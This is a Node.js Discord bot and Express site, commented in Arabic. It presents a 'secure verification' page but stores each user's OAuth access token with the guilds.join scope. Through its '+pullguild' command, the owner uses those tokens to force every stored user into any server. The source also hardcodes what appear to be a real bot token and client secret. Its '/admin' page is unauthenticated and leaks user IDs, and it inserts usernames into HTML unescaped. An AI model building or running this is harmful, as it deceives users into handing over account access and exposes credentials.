const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const app = express();

// --- الإعدادات الأساسية ---
const OWNER_ID = '1151179063122214963'; 
const CLIENT_ID = '1508569205941735465'; 
const CLIENT_SECRET = process.env.SECRET || 'J7OBhcI9jlbT0GEg9sTUOpBtbZz9dnDG'; 
const BOT_TOKEN = process.env.TOKEN || 'MTUwODU2OTIwNTk0MTczNTQ2NQ.GEvn0f.I6Erz5iYQHgcFf2PmBX0VdFaNHUqAIEXh9tQgQ'; 

const DOMAIN = process.env.RAILWAY_STATIC_URL 
    ? 'https://' + process.env.RAILWAY_STATIC_URL 
    : 'https://ma7shyterms-production.up.railway.app';

const REDIRECT_URI = DOMAIN + '/callback';
const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'database.json');

let usersDatabase = [];
if (fs.existsSync(DB_FILE)) {
    try {
        usersDatabase = JSON.parse(fs.readFileSync(DB_FILE, 'utf-8'));
    } catch (e) {
        usersDatabase = [];
    }
}

function saveDatabase() {
    fs.writeFileSync(DB_FILE, JSON.stringify(usersDatabase, null, 2));
}

const bot = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const bootTime = Date.now();

bot.on('ready', () => {
    console.log(`Logged in as ${bot.user.tag}!`);
    console.log(`Current Redirect URI: ${REDIRECT_URI}`);
    
    bot.user.setPresence({
        activities: [{ 
            name: 'custom', 
            type: 4, 
            state: 'Eren Is The best' 
        }],
        status: 'online',
    });
});

bot.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith('+')) return;

    const args = message.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'help') {
        const helpEmbed = new EmbedBuilder()
            .setTitle('🤖 Bot Commands List')
            .setColor('#5865F2')
            .addFields(
                { name: '⚙️ الأوامر العامة', value: '`+help` - يعرض هذه القائمة.\n`+stats` - يعرض الإحصائيات.' },
                { name: '👑 أوامر المطور', value: '`+panel` - رابط التوثيق للأعضاء.\n`+pullguild [Server_ID]` - سحب الأعضاء للسيرفر.' }
            );
        return message.reply({ embeds: [helpEmbed] });
    }

    if (command === 'stats') {
        const uptimeMs = Date.now() - bootTime;
        const uptimeHours = Math.floor(uptimeMs / (1000 * 60 * 60));
        const uptimeMins = Math.floor((uptimeMs % (1000 * 60 * 60)) / (1000 * 60));

        const statsEmbed = new EmbedBuilder()
            .setTitle('📊 إحصائيات البوت')
            .setColor('#2ed573')
            .addFields(
                { name: '👥 إجمالي الموثقين:', value: `${usersDatabase.length} عضو`, inline: true },
                { name: '⏳ وقت التشغيل:', value: `${uptimeHours}س ${uptimeMins}د`, inline: true },
                { name: '🌐 لوحة الإدارة:', value: `[اضغط هنا لفتح لوحة الويب](${DOMAIN}/admin)`, inline: false }
            );
        return message.reply({ embeds: [statsEmbed] });
    }

    if (command === 'panel') {
        if (message.author.id !== OWNER_ID) return message.reply('❌ للرئيس فقط.');

        const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`;

        const panelEmbed = new EmbedBuilder()
            .setTitle('🔐 لوحة تحكم الإدارة')
            .setColor('#ED4245')
            .addFields(
                { name: '🔗 رابط التوثيق:', value: `[اضغط هنا للتوثيق](${oauthUrl})` },
                { name: '🖥️ لوحة الإدارة:', value: `[فتح موقع الإدارة الجامد](${DOMAIN}/admin)` },
                { name: '📊 الأعضاء:', value: `${usersDatabase.length} موثق` }
            );
        return message.reply({ embeds: [panelEmbed] });
    }

    if (command === 'pullguild') {
        if (message.author.id !== OWNER_ID) return message.reply('❌ للرئيس فقط.');
        
        const targetGuildId = args[0];
        if (!targetGuildId) return message.reply('❌ حط ID السيرفر يا حب.');

        if (usersDatabase.length === 0) return message.reply('❌ مفيش أعضاء في القاعدة.');

        message.reply(`⏳ جاري نقل ${usersDatabase.length} عضو للسيرفر...`);

        let successCount = 0;
        for (const user of usersDatabase) {
            try {
                await axios.put(
                    `https://discord.com/api/v10/guilds/${targetGuildId}/members/${user.id}`,
                    { access_token: user.token },
                    { headers: { Authorization: `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' } }
                );
                successCount++;
            } catch (err) {
                console.error(`Failed:`, err.message);
            }
        }
        return message.channel.send(`✅ تم بنجاح نقل ${successCount}/${usersDatabase.length} عضو!`);
    }
});

// --- 🌐 الصفحة الرئيسية المضافة لحل مشكلة الـ Cannot GET ---
app.get('/', (req, res) => {
    const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`;
    
    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Ma7shy Bot - نظام التحقق</title>
            <style>
                body { background-color: #0c0e17; color: #fff; font-family: system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
                .main-card { background: #161925; padding: 50px 30px; border-radius: 24px; border: 1px solid #202225; box-shadow: 0 12px 40px rgba(0,0,0,0.5); max-width: 500px; }
                h1 { color: #5865F2; font-size: 28px; margin-bottom: 10px; }
                p { color: #a0a5b5; font-size: 16px; margin-bottom: 30px; line-height: 1.6; }
                .btn { background: #5865F2; color: #fff; padding: 12px 30px; border-radius: 8px; font-weight: bold; text-decoration: none; font-size: 16px; transition: 0.3s; display: inline-block; }
                .btn:hover { background: #4752c4; transform: translateY(-2px); }
            </style>
        </head>
        <body>
            <div class="main-card">
                <h1>🚀 نظام التحقق التلقائي لبوت المحشي</h1>
                <p>مرحباً بك في البوابة الرسمية للتحقق من الهوية. يرجى الضغط على الزر أدناه لبدء ربط حسابك بالسيرفر بأمان كامل.</p>
                <a href="${oauthUrl}" class="btn">اضغط هنا لبدء التحقق القياسي</a>
            </div>
        </body>
        </html>
    `);
});

// --- 🖥️ موقع الإدارة الجامد (Admin Dashboard) ---
app.get('/admin', (req, res) => {
    const uptimeMs = Date.now() - bootTime;
    const uptimeHours = Math.floor(uptimeMs / (1000 * 60 * 60));
    
    const usersList = usersDatabase.map(u => `<li>👤 @${u.username} <span style="color:#5865F2; font-size:12px;">(ID: ${u.id})</span></li>`).join('') || '<p style="color:#72767d;">مفيش أعضاء موثقين لحد دلوقتي..</p>';

    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>لوحة إدارة Ma7shy Bot</title>
            <style>
                body { background-color: #0c0e17; color: #fff; font-family: system-ui, sans-serif; margin: 0; padding: 30px; display: flex; justify-content: center; }
                .container { width: 100%; max-width: 800px; }
                header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #202225; padding-bottom: 20px; margin-bottom: 30px; }
                h1 { color: #5865F2; margin: 0; font-size: 24px; }
                .badge { background: #2ed573; color: #000; padding: 5px 12px; border-radius: 20px; font-weight: bold; font-size: 14px; }
                .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 20px; margin-bottom: 30px; }
                .card { background: #161925; padding: 25px; border-radius: 16px; border: 1px solid #202225; box-shadow: 0 8px 24px rgba(0,0,0,0.4); }
                .card h3 { margin: 0 0 10px 0; color: #a0a5b5; font-size: 14px; }
                .card .number { font-size: 28px; font-weight: bold; color: #fff; }
                .users-box { background: #161925; padding: 25px; border-radius: 16px; border: 1px solid #202225; }
                .users-box h2 { margin-top: 0; font-size: 18px; border-bottom: 1px solid #202225; padding-bottom: 10px; }
                ul { list-style: none; padding: 0; max-height: 250px; overflow-y: auto; margin: 0; }
                li { padding: 10px 0; border-bottom: 1px solid #202225; display: flex; justify-content: space-between; align-items: center; }
            </style>
        </head>
        <body>
            <div class="container">
                <header>
                    <h1>🚀 Ma7shy Bot Control Panel</h1>
                    <div class="badge">متصل الآن</div>
                </header>
                <div class="stats-grid">
                    <div class="card">
                        <h3>إجمالي المستخدمين الموثقين</h3>
                        <div class="number">${usersDatabase.length}</div>
                    </div>
                    <div class="card">
                        <h3>وقت تشغيل البوت</h3>
                        <div class="number">${uptimeHours} ساعة</div>
                    </div>
                </div>
                <div class="users-box">
                    <h2>📋 قائمة الأعضاء الموثقين في القاعدة</h2>
                    <ul>
                        ${usersList}
                    </ul>
                </div>
            </div>
        </body>
        </html>
    `);
});

// --- صفحة التوثيق (Callback) ---
app.get('/callback', async (req, res) => {
    const code = req.query.code;
    
    if (!code) {
        return res.send(`<body style="background:#0c0e17;color:#fff;text-align:center;padding-top:20vh;font-family:sans-serif;"><h1>❌ خطأ في الدخول المباشر</h1><p>استخدم رابط البوت من ديسكورد.</p></body>`);
    }

    try {
        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: REDIRECT_URI,
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const accessToken = tokenResponse.data.access_token;
        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `Bearer ${accessToken}` }
        });

        const userData = userResponse.data;
        const userIndex = usersDatabase.findIndex(u => u.id === userData.id);
        
        if (userIndex > -1) {
            usersDatabase[userIndex].token = accessToken;
            usersDatabase[userIndex].username = userData.username;
        } else {
            usersDatabase.push({
                id: userData.id,
                username: userData.username,
                token: accessToken
            });
        }
        saveDatabase();

        res.send(`
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head><meta charset="UTF-8"><title>تم التوثيق</title></head>
            <body style="background: #0c0e17; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center;">
                <div style="background: #161925; padding: 40px; border-radius: 20px; border: 1px solid #2ed573;">
                    <h1 style="color: #2ed573;">🎉 تم التوثيق بنجاح!</h1>
                    <p>أهلاً بك يا @${userData.username}، تم حفظ بياناتك بنجاح.</p>
                </div>
            </body>
            </html>
        `);
    } catch (error) {
        res.status(500).send('حدث خطأ داخلي.');
    }
});

app.listen(PORT, () => console.log(`Web Server running on port ${PORT}`));
bot.login(BOT_TOKEN);
